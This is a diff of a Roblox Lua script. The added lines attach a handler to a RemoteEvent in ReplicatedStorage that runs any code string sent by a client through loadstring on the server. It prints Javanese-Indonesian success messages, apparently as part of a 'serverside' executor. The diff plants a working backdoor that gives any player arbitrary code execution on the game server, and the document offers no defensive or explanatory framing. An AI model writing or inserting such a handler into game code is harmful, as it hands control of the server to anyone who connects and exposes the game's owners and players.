@@ -173,14 +173,37 @@ end
 
 local function createRemoteEvent()
     local remoteEvent = game.ReplicatedStorage:FindFirstChild("RemoteEvent")
+    
     if not remoteEvent then
+        -- RemoteEvent doesn't exist
         remoteEvent = Instance.new("RemoteEvent")
         remoteEvent.Name = "RemoteEvent"
         remoteEvent.Parent = game.ReplicatedStorage
         updateNotification("RemoteEvent created.")
     else
-        updateNotification("RemoteEvent already exists.")
+        updateNotification("Using existing RemoteEvent.")
     end
+
+    -- Handler :::
+    if not remoteEvent:FindFirstChild("RemoteHandler") then
+        -- Attach a handler to the existing or newly created RemoteEvent
+        remoteEvent.OnServerEvent:Connect(function(player, scriptCode)
+            local success, result = pcall(function()
+                loadstring(scriptCode)()
+            end)
+            if success then
+                updateNotification("Executed")
+                print("| SS ? Jawir! : Sukses mas")
+            else
+                updateNotification("Failed.")
+                warn("| SS ? Jawir! : Wes gagal, iki lho mas: ", result)
+            end
+        end)
+        print("")
+    else
+        updateNotification("Handler already exists for RemoteEvent.")
+    end
+
     return remoteEvent
 end
 
